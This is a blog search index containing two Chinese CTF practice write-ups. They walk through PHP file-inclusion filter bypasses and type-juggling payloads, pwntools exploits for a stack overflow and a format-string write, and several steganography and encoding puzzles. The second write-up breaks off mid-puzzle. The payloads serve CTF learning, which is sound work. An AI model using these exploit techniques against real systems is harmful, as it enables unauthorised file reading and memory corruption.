<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>贰零贰肆年拾壹月·散装刷题月记</title>
    <url>/2024/11/21/2024-11%20WriteUp/</url>
    <content><![CDATA[<h1>贰零贰肆年拾壹月刷题月记</h1>
<hr>
<h2 id="说在前面：">说在前面：</h2>
<p>现在是 21 号的晚上九点，整了半个周的博客终于可以正式投入使用了。<br>
摸索了一下 md 的基本语法，从语雀直接转投 Vscode 。</p>
<p><em>虽然语雀的一些功能的确好用，但是 md 不可以直接带图片导出这一点实在是太蛋疼了，就算使用工具转码， md 文件也会出现错误，语雀的图片 cdn 的防外链机制更是 ex 到了一种境界。</em></p>
<p><s>所以有富哥送我一份 Typora 吗谢谢你谢谢你谢谢你</s></p>
<p>咳咳，回到正题上来，如你所见，这一周的时间基本都用在搞这个博客上了，所以题是没什么时间刷了，加上后面还有一个强网杯的线上赛要打，可以预见到11月刷的散题肯定是不多的。</p>
<p>不过既然要刷，就得尽力刷好一点。</p>
<p>也做了几道 pwn 题，成功的将 pwn 水平从啥也不会提升到了至少能做个pwn的签到题。<br>
做多了其实也可以发现 pwn 是挺有趣的，很享受这个<s>坐牢</s>的过程。</p>
<p><s>这就是你这周到现在一道 web 都没刷的理由吗死鬼</s></p>
<p>今天还有时间， ctfer 的一天，从晚上九点开始。</p>
<p>就这样吧。</p>
<p><strong>11-22 更新：</strong> 攻防世界的环境又分发不了了，做点 Misc 罢。</p>
<hr>
<h2 id="Web">Web</h2>
<h3 id="攻防世界-GFSJ1060-：file-include">攻防世界 GFSJ1060 ：file_include</h3>
<p>打开页面，可以看到页面源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到代码开头包含了<code>check.php</code>，推测有过滤。<br>
读取<code>get</code>传递的<code>filename</code>参数并包含文件。</p>
<p>很明显的 php 文件包含漏洞，这里利用 php 伪协议<code>php://filter</code>来尝试读取文件。</p>
<p>构造 payload ：<code>?filename=php://filter/convert.base64-encode/resource=./check.php</code><br>
提示<code>do not hack!</code></p>
<p>猜测 payload 被过滤到了，增减 payload 片段可以发现<code>convert</code> <code>base64</code> <code>encode</code>均被过滤。</p>
<p>多尝试几个过滤器，最后发现<code>convert.iconv</code>没有被过滤。</p>
<p>那就简单了，利用<code>convert.iconv</code>构造 payload：<br>
<code>?filename=php://filter/convert.iconv.UTF-8.UTF-16/resource=./check.php</code></p>
<p>获取到 php 文件内容，我们实现了任意文件读取。</p>
<p>多猜测几个 flag 可能存在的地方，最终在<code>/flag.php</code>处发现 flag 。<br>
flag:<code>cyberpeace&#123;a8f4c57819d000d321d2614151e98209&#125;</code></p>
<h3 id="攻防世界-GFSJ1059-：easyphp">攻防世界 GFSJ1059 ：easyphp</h3>
<p>源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>想要得到 flag 需要通过几层条件判断。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>第一层判断要求我们 get 传入参数<code>a</code>的大小大于<code>6000000</code> ,且参数的长度小于 3 。<br>
这里可以传入科学计数法<code>1e9</code>通过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure>
<p>第二层判断要求我们传入参数<code>b</code>的MD5值后 6 位等于<code>8b184b</code>.<br>
写个脚本哈希碰撞:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">inputs</span>):</span><br><span class="line"></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(inputs.encode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999</span>):</span><br><span class="line"></span><br><span class="line">    m = md5(<span class="built_in">str</span>(i))[-<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>  m == <span class="string">&quot;8b184b&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>碰撞出对应的值为<code>53724</code>.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)</span><br></pre></td></tr></table></figure>
<p>第三层判断要求我们传入 json 格式数据，数据中的 m 不可为数字，但是 m 又需要大于<code>2022</code>.<br>
利用弱类型比较，我们可以传入<code>9999c</code>满足条件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<p>第四层则要求我们传入有两个数据的数组<code>n</code>，其中包含一个数组。<br>
<code>[[],0]</code>即可。</p>
<p><em>做题的时候运气比较好，撞对了最后一个条件判断</em></p>
<p>最后一个条件判断则通过添加一个<code>0</code>，利用<code>array_search</code>的弱比较通过即可。</p>
<p>最后 payload：<code>?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;9999c&quot;,&quot;n&quot;:[[],0]&#125;</code></p>
<p>得到 flag：<code>cyberpeace&#123;e29533310551b5d342e01e40b2736035&#125;</code></p>
<hr>
<h2 id="Pwn">Pwn</h2>
<h3 id="攻防世界-GFSJ0470-：guess-num">攻防世界 GFSJ0470 ：guess_num</h3>
<p>获取题目附件，先 checksec 查看：</p>
<p><em>小白题应该不会整什么花活，这里我们走个过场就行了</em></p>
<p>64 位，使用 IDA64 打开：<br>
主函数：<img src="../resources/images/2024-11_assert/1.webp" alt=""><br>
可以看到在通过条件判断之后会调用<code>sub_C3E</code>函数，而这个函数会输出 flag 。</p>
<p>条件判断的核心是我们输入的数字是否与随机生成的数字相同，重复判断 10 次。</p>
<p>思路很简单，<code>gets</code>函数可以让我们控制<code>v7</code>变量，在没有验证输入长度的情况下我们可以自由栈溢出，从而覆盖<code>seed</code>以达到控制随机数生成的效果。</p>
<p>这里可以直接覆盖 100 个 1 上去，懒得算了。</p>
<p>写代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * (<span class="number">32</span>) + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/k0relapse/guess_num&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v6 = <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;%d\n&quot;</span>, v6 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>这里就很奇怪，思路应该没问题，但是官方 wp 死活复现不了，当时是爆破爆出来的</em></p>
<p>得到 flag .</p>
<h3 id="攻防世界-GFSJ0463-：CGfsb">攻防世界 GFSJ0463 ：CGfsb</h3>
<p>checksec ，查出开了 Canary 。</p>
<p>IDA 查看：</p>
<p><img src="../resources/images/2024-11_assert/8.webp" alt=""></p>
<p>发现 <code>printf(s)</code></p>
<p>明显的格式化字符串漏洞。</p>
<p>查找我们可以控制的输入点：</p>
<p><code>fgets(s, 100, stdin);</code> 处有一个溢出。</p>
<p>题目要求 <code>pwnme</code> 要等于 8 ，查找 <code>pwnme</code> 的地址：</p>
<p><img src="../resources/images/2024-11_assert/9.webp" alt=""></p>
<p>利用格式化字符串漏洞算偏移量，溢出点打进去即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwnme_addr = p32(<span class="number">0x804A068</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/k0relapse/pwn/prog/CGfsb&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(name)</span><br><span class="line">io.sendline(message)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="../resources/images/2024-11_assert/10.webp" alt=""></p>
<p><code>pwnme</code> 要为 8 ，那偏移就是 10 .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwnme_addr = p32(<span class="number">0x804A068</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = pwnme_addr + <span class="string">b&#x27;%04c%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./CGfsb&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>打进去即可得到 flag 。</p>
<hr>
<h2 id="Misc">Misc</h2>
<h3 id="ISCTF-2024-老八奇怪自拍照">ISCTF 2024 老八奇怪自拍照</h3>
<p>下载文件就可以看到图片颜色具有很严重的失真。</p>
<p>使用 <code>stegsolve</code> 工具查看各通道颜色信息，发现 <code>R</code> 的 <code>5</code> 通道，<code>G</code> 的 <code>2</code> 通道， <code>B</code> 的 <code>1</code> 通道存在隐写。</p>
<p>使用 <code>stegsolve</code> 的 <code>Data Extract</code> 功能提取隐写信息，最后得到一张 <code>jpg</code> 图片。</p>
<p>该图片的 Exif 信息包含 <code>1ScTf2024!</code> 字符串，猜测可能是某种具有加密功能的隐写手段的密码。</p>
<p>尝试 <code>steghide</code> 提取，得到 Flag：<code>ISCTF&#123;St4gs0lve_Rbg_S4eGh1de_H1de!!!&#125;</code></p>
<h3 id="攻防世界-GFSJ1197：miao">攻防世界 GFSJ1197：miao~</h3>
<p>下载附件，得到一个 <code>jpg</code> 图片。</p>
<p>010 打开查看，文件尾部有一个 <code>WAV</code> 文件，提取；</p>
<p>Audacity 打开查看频谱图，发现 <code>CatCTF</code> 字样，推测是密码。</p>
<p>尝试 <code>jpg</code> 和 <code>wav</code> 文件的各种隐写方式，最后 Deepsound解出得到一个txt：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊</span><br></pre></td></tr></table></figure>
<p>猜测是兽音加密，解密得到 flag ：<br>
<code>CatCTF&#123;d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~&#125;</code></p>
<h3 id="GlacierCTF-2024-FindMe">GlacierCTF 2024 FindMe</h3>
<p><em>没有正式参赛，就不开新坑了</em></p>
<p>下载附件，得到一个 pdf 文件。</p>
<p>pdf 文件里面一堆看不懂的文字，鉴定为没有用处。</p>
<p>010 大法打开查看 16 进制数据，注意到数据里藏着 png 的文件头，但是被分割成了很多块。</p>
<p>研究一下 pdf 的数据结构，掐头去尾，再写正则，使用 010 的替换功能去除 pdf 结构数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0Aendstream0x0Aendobj0x0A0A([0-9][1-9][1-9]|[0-9][1-9]) 0 obj0x0A&lt;&lt;/Length 100&gt;&gt;0x0Astream0x0A</span><br></pre></td></tr></table></figure>
<p>保存即可得到 flag ：<br>
<img src="../resources/images/2024-11_assert/chall.png" alt=""></p>
<h3 id="攻防世界-GFSJ0278-：picture2">攻防世界 GFSJ0278 ：picture2</h3>
<p>下载得到一张 png ，010 打开可以发现这个其实是 jpg 图片，不过这并不重要。</p>
<p><img src="../resources/images/2024-11_assert/2.webp" alt=""></p>
<p>在文件尾发现 zlib 压缩后的文件，解压得到一串 base64 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S1ADBBQAAQAAADkwl0xs4x98WgAAAE4AAAAEAAAAY29kZePegfAPrkdnhMG2gb86/AHHpS0GMqCrR9s21bP43SqmesL+oQGo50ljz4zIctqxIsTHV25+1mTE7vFc9gl5IUif7f1/rHIpHql7nqKPb+2M6nRLuwhU8mb/w1BLAQI/ABQAAQAAADkwl0xs4x98WgAAAE4AAAAEACQAAAAAAAAAIAAAAAAAAABjb2RlCgAgAAAAAAABABgAAFvDg4Xa0wE8gAmth9rTATyACa2H2tMBUEsFBgAAAAABAAEAVgAAAHwAAADcAFtQeXRob24gMi43XQ0KPj4+IKh9qH2ofQ0KDQpUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6DQogIEZpbGUgIjxweXNoZWxsIzA+IiwgbGluZSAxLCBpbiA8bW9kdWxlPg0KICAgIKh9qH2ofQ0KWmVyb0RpdmlzaW9uRXJyb3I6IKh9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofSA8LSBwYXNzd29yZCA7KQ0KPj4+IAA=</span><br></pre></td></tr></table></figure>
<p>解码可以得到：</p>
<p><img src="../resources/images/2024-11_assert/3.webp" alt=""></p>
<p><em>前两个字符其实原本是 KP , 截图截的是修改过的文件</em></p>
<p>注意到有一个 zip file 和一段 python 的 Traceback ，zip 存在密码，而 Traceback 提示我们密码是被 <code>¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;</code> 替换的部分。</p>
<p>思路是找到 <code>Zero Division Error</code> 对应的报错信息</p>
<p>猜测对应可能的报错信息为 <code>integer division or modulo by zero</code></p>
<p>解压得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin 644 key.txt</span><br><span class="line">G0TE30TY[,C,X.$%&amp;,C@Y,T5&quot;.#5%0C%&quot;-#,Y04)&amp;1C8Q-S,Q.49]</span><br><span class="line">`</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>明显的 uuencode ，解码得到 flag ：<br>
<code>CISCN&#123;2388AF2893EB85EB1B439ABFF617319F&#125;</code></p>
<h3 id="攻防世界-GFSJ0514-：stegano">攻防世界 GFSJ0514 ：stegano</h3>
<p>题目是个 pdf 文件，常规思路挪开 pdf 页面元素，得到 hint ：<code>Close-butstillnothere!</code></p>
<p>证明信息应该就在 pdf 页面中。</p>
<p>可见的页面上找不到 flag ，猜测在界面外。</p>
<p><code>Ctrl + A</code> 再 copy 到 记事本，可以发现有隐藏的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</span><br></pre></td></tr></table></figure>
<p>猜测是 <code>mores</code> , 尝试 <code>B</code> 为长码，<code>A</code> 为短码。</p>
<p>替换后解码，得到 flag : <code>flag&#123;1NV151BL3M3554G3&#125;</code></p>
<h3 id="攻防世界-GFSJ1088-：-中等-QR1">攻防世界 GFSJ1088 ：[中等]QR1</h3>
<p>题目附件是一张 png ，放大看可以找到很淡的 QR 码痕迹。</p>
<p>调整对比度，亮度，扫描即可得到 flag 。<br>
<img src="../resources/images/2024-11_assert/enc.webp" alt=""><br>
<code>flag&#123;AHA_U_Kn0w_QR_c0d3_312468ed-ea59-4fe9-9cd2-b5e9d8b39498&#125;</code></p>
<h3 id="攻防世界-GFSJ0972-：我们生活在南京">攻防世界 GFSJ0972 ：我们生活在南京</h3>
<p>mp3 音频，打开听可以很明显的推断是摩尔斯电码题</p>
<p>Audacity 打开，对着频谱图抄：<br>
<img src="../resources/images/2024-11_assert/4.webp" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..-. .-.. .- --. -.-. .-- .. ..... ....- - .-. ....- -.. .. - .. ----- -. -- ...-- - .... ----- -..</span><br></pre></td></tr></table></figure>
<p>解码得到 flag：<code>flag&#123;cwi54tr4diti0nm3th0d&#125;</code></p>
<h3 id="攻防世界-GFSJ0319-：Recover-Deleted-File">攻防世界 GFSJ0319 ：Recover-Deleted-File</h3>
<p>sleuthkit 查看磁盘镜像内文件信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fls disk-image</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d/d 11: lost+found</span><br><span class="line">r/r * 12:       flag</span><br><span class="line">V/V 257:        $OrphanFiles</span><br></pre></td></tr></table></figure>
<p>含有 flag 文件，extundelete 恢复出来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">extundelete disk-image --restore-all</span><br></pre></td></tr></table></figure>
<p>尝试 cat 文件，发现不是文本文件。</p>
<p>给权限执行即可得到 flag ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your flag is:</span><br><span class="line">de6838252f95d3b9e803b28df33b4baa</span><br></pre></td></tr></table></figure>
<h3 id="攻防世界-GFSJ0361-：qr-easy">攻防世界 GFSJ0361 ：qr-easy</h3>
<p><img src="../resources/images/2024-11_assert/5.webp" alt=""></p>
<p>观察到题目给的二维码图片保留了数据区的信息。</p>
<p>利用 Qrazybox 工具手动输入：</p>
<p><img src="../resources/images/2024-11_assert/6.webp" alt=""></p>
<p>强制识别即可得到 flag ：</p>
<p><img src="../resources/images/2024-11_assert/7.webp" alt=""></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Practice</tag>
      </tags>
  </entry>
  <entry>
    <title>贰零贰伍年壹月·散装刷题月记</title>
    <url>/2025/01/01/2025-01%20WriteUp/</url>
    <content><![CDATA[<h1>贰零贰伍年壹月刷题月记</h1>
<hr>
<h2 id="说在前面">说在前面</h2>
<pre><code>新年快乐鸭~~~
</code></pre>
<div class="gallery-container" data-type="data" data-button="一些贺图">
      <div class="gallery-items">[{"url":"../../../../resources/images/Happy_NewYear/0b7d23bdbc3ae6bda5f75911910b322.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/4c5783164ee4fd8e1bd523f127fcbd1.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/9988384bada4385b0825334aac6fa58.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/a842f3e7c2b1abd487b2f713440ee3a.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/e3b2241014932255dce8eec549acb2f.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/8eb64b60aabb0c15103d883acd5012d.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/edd88de02275a3c4124466c029f6bf0.jpg","alt":""},{"url":"../../../../resources/images/Happy_NewYear/8ed90687cef734a994da5b7303932e3.jpg","alt":""}]</div>
    </div>
<hr>
<h2 id="Misc">Misc</h2>
<h3 id="NSSCTF-羊城杯-2023-决赛-easy00aes">NSSCTF [羊城杯 2023 决赛] easy00aes</h3>
<p>下载下来一个 png 文件， 在文件末尾处可以发现一个 zip 文件。</p>
<p>提取出来解压，发现有密码。</p>
<p>注意到文件名很像被 Base64 编码过的，解码即可得到压缩包密码：<code>asddsa</code></p>
<p>解压可以得到 flag.jpg （ 实际为 png ）和藏了零宽字符隐写的文本。</p>
<p>零宽字符藏了 AES 的 key ：<code>adsadwadsadad</code></p>
<p>png 有宽高隐写，藏了密文：<code>1eu4+X0rAE79+rZQBxhAG7t85wcd20u0VfupQJx1H0Hm6HVnHQoLmW0M9D9i/yo9</code></p>
<p>（ 这里 <code>0</code> 和 <code>O</code> 可能看不出，解密的时候多试几遍即可 ）</p>
<p>由于 key 只有 13 位，选择用 00 补齐。</p>
<p>解密即可。</p>
<p><img src="../resources/images/2025-01_assert/1.webp" alt=""></p>
<h3 id="NSSCTF-西湖论剑-2022-mp3">NSSCTF [西湖论剑 2022] mp3</h3>
<p>常规套题</p>
<p>下载下来一个 mp3 文件，010 打开可以发现藏在文件尾部的 png 文件。</p>
<p>提取出来：</p>
<p><img src="../resources/images/2025-01_assert/stegpng.png" alt=""></p>
<p>一眼鉴定为隐写藏了文件，stegsolver 随便选一个通道看一下：</p>
<p><img src="../resources/images/2025-01_assert/2.webp" alt=""></p>
<p>zip 压缩包， 提取出来会发现有密码。</p>
<p>没有其他的信息，就回头研究一下 mp3 文件。</p>
<p>频谱图没有猫腻，盲狙一手 MP3stego，没有密码，提取出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8750d5109208213f</span><br></pre></td></tr></table></figure>
<p>回去解压，得到一段类似 Jsfuck 的玩意：</p>
